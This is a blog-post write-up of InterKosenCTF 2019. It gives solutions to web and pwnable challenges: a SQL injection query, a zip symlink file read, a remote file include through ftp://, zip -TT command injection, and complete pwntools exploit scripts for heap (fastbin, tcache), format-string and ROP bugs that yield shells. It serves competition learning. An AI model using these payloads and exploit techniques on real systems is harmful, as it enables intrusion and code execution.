---
layout: post
title: "InterKosenCTF writeup"
date: 2019-08-12 15:00
comments: true
categories: CTF 
---

1st placed at Mashiro(@Emilia)



writeup is comming soon.



# Crypto





# Forensics





# Reversing





# Web

## uploader

It have file upload and download functions.

And it support search function, but it is vulnerable to SQL Injection.

```php
// search
if (isset($_GET['search'])) {
    $rows = $db->query("SELECT name FROM files WHERE instr(name, '{$_GET['search']}') ORDER BY id DESC"); // <-- we can sql injection
    foreach ($rows as $row) {
        $files []= $row[0];
    }
}
```

Therefore we can get `secret_file`'s passcode.

**Query** : ?search=') union select passcode from files-- -

get a passcode for secret_file, "the_longer_the_stronger_than_more_complicated".

Next just input passcode "the_longer_the_stronger_than_more_complicated" for downloading secret_file.

Then we got a flag :)

**FLAG** : KosenCTF{y0u_sh0u1d_us3_th3_p1ac3h01d3r}



## Image Extractor

This chall is developed by singtra.

It support source code, but i think that it have not vulnerable code.

But, `zip` is possible to contain symbolic link file.

```ruby
get '/image/:name/:image' do
  if params[:name] !~ /^[a-f0-9]{32}$/ || params[:image] !~ /^[A-Za-z0-9_]+\.[A-Za-z0-9_]+$/
    @err = "Not Found"
    erb :index
  else
    zipfile = File.join("workdir", params[:name] + ".zip")
    filedir = File.join("workdir", SecureRandom.hex(16))
    file = File.join(filedir, params[:image])
    system("unzip -j #{zipfile} word/media/#{params[:image]} -d #{filedir}") # extract file
    if File.exists?(file)
      send_file(file) # read file
    else
      @err = "Not Found"
      erb :index
    end
  end
end
```

So, i make arbitrary docx as symbolic link file `flag.png` linkning  to `/flag`, then upload docx file.

Finally got a flag as access http://URL/flag.png.

**FLAG** : KosenCTF{sym1ink_causes_arbitrary_fi13_read_0ft3n}



## Neko Loader

This chall is support only download function and source code.

Here is code for download:

```php
<?php
if (empty($_POST['ext']) || empty($_POST['name'])) {
    // Missing parameter(s)
    header("HTTP/1.1 404 Not Found");
    print("404 Not Found");
    exit;
} else {
    $ext = strtolower($_POST['ext']);   // Extension
    $name = strtolower($_POST['name']); // Filename
}

if (strlen($ext) > 4) {
    // Invalid extension
    header("HTTP/1.1 500 Internal Server Error");
    print("500 Internal Server Error");
    exit;
}

switch($ext) {
    case 'jpg':
    case 'jpeg': $mime = 'image/jpg'; break;
    case 'png': $mime = 'image/png'; break;
    default: $mime = 'application/force-download';
}

// Download
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Cache-Control: private', false);
header('Content-Type: '.$mime);
header('Content-Transfer-Encoding: binary');
include($ext.'/'.$name.'.'.$ext);
?>
```

We can control to ext and name value.

And server allow RFI, it can confirm at **phpinfo.php**.

So i try to ftp schema for RFI.

ext is `ftp:` and name `/[SERVER]/a`.

Finally include's argument is completed as follows:

```
include('ftp://[SERVER]/a.ftp:');
```

**FLAG** : KosenCTF{n3v3r_4ll0w_url_1nclud3}



## E-Sequel-Injection

Oh it is SQL Injection chall.



**FLAG** : KosenCTF{Smash_the_holy_barrier_and_follow_me_in_the_covenant_of_blood_and_blood}



## Image Compressor

In sourecode, we found some code to control `options` at system.

Look this:

```
# man zip
...
-T
--test
Test the integrity of the new zip file. If the check fails, the old zip file is unchanged and (with the -m option) no input files are removed.

-TT cmd
--unzip-command cmd
Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:

zip archive file1 file2 -T -TT "./unzip -tqq"

In cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command.  The return code is checked for success (0 on Unix).
...
```

So, we can command injeciton using -T, -TT.

**e.g.** zip ./test.zip -T -TT"ls -al /"

**FLAG** : KosenCTF{4rb1tr4ry_c0d3_3x3cut10n_by_unz1p_c0mm4nd}



# Pwnable

## Fastbin Tutorial

It's simple fastbin tutorial problem.

So, i skip detail description for this.

```c
Welcome to Double Free Tutorial!
In this tutorial you will understand how fastbin works.
Fastbin has various security checks to protect the binary
from attackers. But don't worry. You just have to bypass
the double free check in this challenge. No more size checks!
Your goal is to leak the flag which is located at 0x55ece5c0e240.

[+] f = fopen("flag.txt", "r");
[+] flag = malloc(0x50);
[+] fread(flag, 1, 0x50, f);
[+] fclose(f);

This is the initial state:

 ===== Your List =====
   A = (nil)
   B = (nil)
   C = (nil)
 =====================

 +---- fastbin[3] ----+
 | 0x0000000000000000 |
 +--------------------+
           ||
           \/
(end of the linked list)

You can do [1]malloc / [2]free / [3]read / [4]write
```

1. Do not delete malloc_ptr on free
2. A alloc -> A free -> A fd overwrite flag address -> allocation flag address
3. read -> get flag

```python
from pwn import *

t = remote('pwn.kosenctf.com',9001)

l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

r("Your goal is to leak the flag which is located at ")
flag = int(t.recv(14),16)
print hex(flag)

go("1")
go2("A")

go("2")
go2("A")

go("4")
go2("A")
go(p64(flag-0x10))

go("1")
go2("A")
go("1")
go2("A")

go("3")
go2("A")

t.interactive()
```

**FLAG** : KosenCTF{y0ur_n3xt_g0al_is_t0_und3rst4nd_fastbin_corruption_attack_m4yb3}



## Shopkeeper

If you buy some item, then each item's event is executed.

```c
void use(item_t *inventory)
{
  char buf[0x10];

  /* Use the item */
  if (*inventory->name != 0) {

    dputs("* Wanna use it now?");
    printf("[Y/N] > ");
    readline(buf);

    if (*buf == 'Y') {
      (*inventory->event)();
    }

  }
}
```

Here is item list:

```c
* Hello, traveller.
* What would you like to buy?
 $25 - Cinnamon Bun
 $15 - Biscle
 $50 - Manly Bandanna
 $50 - Tough Glove
 $9999 - Hopes

```

If you purchase `Hopes`, then you can get shell.

So, our goal is purchase Hopes :)

```c
gdb-peda$ x/s 0x55555575701c
0x55555575701c:	"Hopes"
gdb-peda$ x/15i 0x0000555555554b16 <- Hopes event
   0x555555554b16 <item_YourGoal>:	push   rbp
   0x555555554b17 <item_YourGoal+1>:	mov    rbp,rsp
   0x555555554b1a <item_YourGoal+4>:	lea    rdi,[rip+0x484]        # 0x555555554fa5
   0x555555554b21 <item_YourGoal+11>:	call   0x5555555549aa <dputs>
   0x555555554b26 <item_YourGoal+16>:	lea    rdi,[rip+0x491]        # 0x555555554fbe
   0x555555554b2d <item_YourGoal+23>:	call   0x5555555549aa <dputs>
   0x555555554b32 <item_YourGoal+28>:	lea    rdi,[rip+0x49a]        # 0x555555554fd3
   0x555555554b39 <item_YourGoal+35>:	call   0x555555554820 <system@plt>
   0x555555554b3e <item_YourGoal+40>:	nop
   0x555555554b3f <item_YourGoal+41>:	pop    rbp
   0x555555554b40 <item_YourGoal+42>:	ret

```

In shop function, we can overwrite money.

```c
void shop(item_t *inventory)
{
  char buf[LEN_NAME];
  item_t *p, *t;
  int money = 100;

  /* Show and ask */
  for(p = item; p != 0; p = p->next) {
    printf(" $%d - %s\n", p->price, p->name);
  }
  printf("> ");
  readline(buf);

  /* Purchase */
  t = purchase(buf);
  if (t == NULL) {

    dputs("* Just looking?");

  } else if (money >= t->price) {

    money -= t->price;
    memcpy(inventory, t, sizeof(item_t));
    dputs("* Thanks for your purchase.");

  } else {

    dputs("* That's not enough money.");

  }
}

```

1. overwrite money > 9999
2. purchase Hopes
3. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9004)
#t = process('./chall')

l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))
pause()

go("Hopes" + "\x00"*3 + "a"*51)
go("Y")
t.interactive()

```

**FLAG** : KosenCTF{th4t5_0v3rfl0w_41n7_17?}



## Bullsh

It's simple shell binary, but it doesn't have lots of command.

Here is some code for processing commands.

```c
int __fastcall bullexec(const char *a1)
{
  char *i; // [rsp+18h] [rbp-8h]

  for ( i = (char *)a1; *i; ++i )
  {
    if ( *i == 10 || *i == 32 )
    {
      *i = 0;
      break;
    }
  }
  if ( !strcmp(a1, "ls") )
    return system(a1);
  if ( !strcmp(a1, "exit") )
    exit(0);
  printf(a1); // <- this!!
  return puts(": No such command");
}

```

`printf(a1)` is vulnerable to **format string bug**(fsb).

Its very simple fsb problem,so i try to exploit as follows :

1. `printf@got` overwrite `system`
2. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9003)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter("$",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

go("%25$p") # 12
t.recv(1)

libc = int(t.recv(14),16) - l.symbols['__libc_start_main'] -0xe7
print hex(libc)
abc = (libc+l.symbols['system'] & 0xffffffff)
abc2 = abc & 0xffff
abc1 = abc >> 16
if (abc1 > abc2):
    p = "%" + str(abc2) + "c%18$hn" +  "%" + str(abc1-abc2) + "c%19$hn"
    p += "a"*(48-len(p))
    p += p64(e.got['printf']) + p64(e.got['printf']+2)
else :
    p = "%" + str(abc1) + "c%18$hn"+ "%" + str(abc2-abc1) + "c%19$hn"
    p += "a"*(48-len(p))
    p += p64(e.got['printf']+2) + p64(e.got['printf'])

print hex(abc1), hex(abc2)
pause()
go(p)

go("sh\x00")

t.interactive()

```

**FLAG** : KosenCTF{f0rm4t_str1ng_3xpl01t_0n_x64_1s_l4zy}



## Stegorop

This is simple ROP Prob.

It occur overflow to 0x30 bytes, but we can't return **main** or **start**.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v4; // [rsp+0h] [rbp-80h]
  char buf; // [rsp+10h] [rbp-70h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  if ( lock )
    _abort(*argv);
  puts("===== Online Steganography Tool =====");
  printf("Input: ", 0LL, argv);
  read(0, &buf, 0x100uLL); <-- this!!!
  stagernography(&buf);
  if ( lock )
    _abort(*v4);
  lock = 1;
  return 0;
}

```

1. `RBP` set `printf@got+0x70`
2. execute `puts(puts_got)` for leaking library base address.
3. return `read(0, &buf, 0x100uLL)` for overwrite `printf@got`
4. `printf@got` overwrite `oneshot gadget` at `read`
5. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9002)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendafter(":",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))
pause()
go("a"*0x70 + p64(e.got['printf']+0x70) + p64(0x00000000004009b3) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(0x00000000004008FE))
t.recvline()

libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['puts']
pp('libc')

pause(1)
t.send(p64(libc + 0x4f322))

t.interactive()

```

**FLAG** : KosenCTF{r0p_st4g3r_is_piv0t4l}



## Kitten

This chall is OOB read/write and Tcache poisoning

Here is OOB Read at `feed_kitten`:

```c
int feed_kitten()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Which one?");
  list_kittens();
  printf("> ");
  v1 = readint();
  if ( v1 >= count )
    result = puts("There's no such kitten...");
  else
    result = printf("%s: Meow!\n", ptr[v1]); <- this!!!!
  return result;
}

```

Here is OOB Write at `foster`:

```c
int foster()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Which one?");
  list_kittens();
  printf("> ");
  v1 = readint();
  if ( v1 >= count )
    return puts("There's no such kitten...");
  --count;
  printf("%s: Meow!\n", ptr[v1]);
  free(ptr[v1]); <-- this!!!
  result = v1;
  ptr[v1] = ptr[count];
  return result;
}

```

In `find_kitten`, we can located arbitrary data as name.

Therefore i make fake chunk for `tcache poisoning` in bss section

```c
int find_kitten()
{
  int v0; // ST0C_4
  int v1; // ebx

  if ( count > 9 )
    return puts("You have too many kittens to take care of.");
  puts("You found a kitten!");
  printf("Name: ");
  v0 = readline(name, 127LL);
  v1 = count;
  ptr[v1] = (char *)malloc(v0);
  strcpy(ptr[count], name);
  return count++ + 1;
}

```

1. Leak library address using `feed_kitten`
2. Free fake chunk in bss section using `foster`
3. Tcache bin's fd overwrite free_hook using `malloc_func`
4. After free, get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9005)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

def add(name):
    go("1")
    go2(str(name))

def show(index):
    go("2")
    go(str(index))

def delete(index):
    go("3")
    go(str(index))

add(p64(e.got['puts']))

show(-16)
t.recv(1)
libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['puts']
pp('libc')

add(p64(0x602040) + p64(0)*2 + p64(0x21) + p64(0)*3 + p64(0x10000))
pause()
delete(-16)

add(p64(0)*3  + p64(0x21) + p64(libc+l.symbols['__free_hook']))
add(p64(0))
add(p64(libc+0x4f322))
delete(0)

t.interactive()

```

**FLAG** : KosenCTF{00b_4nd_tc4ch3_p01s0n1ng}

